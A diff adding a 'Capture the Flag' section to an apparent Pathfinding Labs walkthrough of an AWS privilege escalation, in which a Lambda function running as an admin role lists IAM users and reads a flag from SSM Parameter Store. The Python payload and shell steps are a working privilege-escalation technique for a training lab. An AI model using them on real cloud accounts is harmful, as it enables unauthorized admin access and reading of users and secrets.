@@ -155,6 +155,51 @@ cat /tmp/lambda_response.json | jq '.'
 
 If the response includes a `userCount` and a list of IAM users, you have confirmed full administrative access in the prod account. The Lambda function executed `iam:ListUsers` — an operation that requires admin-level permissions — proving that the function ran as `pl-Lambda-admin`.
 
+## Capture the Flag
+
+Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it proves the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which `AdministratorAccess` (held by the `pl-Lambda-admin` execution role) provides implicitly.
+
+Since the Lambda function runs as `pl-Lambda-admin`, you can have it retrieve the SSM parameter during invocation. Update the Lambda payload to also call SSM:
+
+```bash
+cat > /tmp/lambda_payload.py << 'EOF'
+import boto3
+import json
+
+def lambda_handler(event, context):
+    iam = boto3.client('iam')
+    response = iam.list_users()
+    users = response.get('Users', [])
+
+    ssm = boto3.client('ssm')
+    flag_param = ssm.get_parameter(
+        Name='/pathfinding-labs/flags/passrole-lambda-admin-to-admin'
+    )
+    flag_value = flag_param['Parameter']['Value']
+
+    return {
+        'statusCode': 200,
+        'body': json.dumps({
+            'message': 'Executing as Lambda admin role!',
+            'userCount': len(users),
+            'users': [u['UserName'] for u in users],
+            'flag': flag_value
+        })
+    }
+EOF
+
+cd /tmp && zip -q lambda_payload.zip lambda_payload.py && cd -
+```
+
+After creating and invoking the Lambda function (following the steps above), parse the flag from the response:
+
+```bash
+cat /tmp/lambda_response.json | jq -r '.body | fromjson | .flag'
+# flag{...}  — your scenario-specific flag value
+```
+
+The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism is identical across every `to-admin` scenario — only the scenario ID in the SSM parameter path changes.
+
 ## What Happened
 
 You traversed a three-hop privilege escalation chain that crossed AWS account boundaries:
